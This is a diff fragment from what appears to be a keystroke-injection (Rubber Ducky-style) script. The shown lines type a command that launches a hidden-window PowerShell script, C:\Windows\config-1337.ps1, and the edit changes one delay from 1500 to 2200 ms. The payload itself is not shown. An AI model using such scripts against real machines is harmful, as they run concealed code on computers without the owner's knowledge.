@@ -53,7 +53,7 @@ ENTER
 DELAY 100
 STRING powershell.exe -windowstyle hidden -File C:\Windows\config-1337.ps1
 ENTER
-DELAY 1500
+DELAY 2200
 TAB
 DELAY 20
 TAB
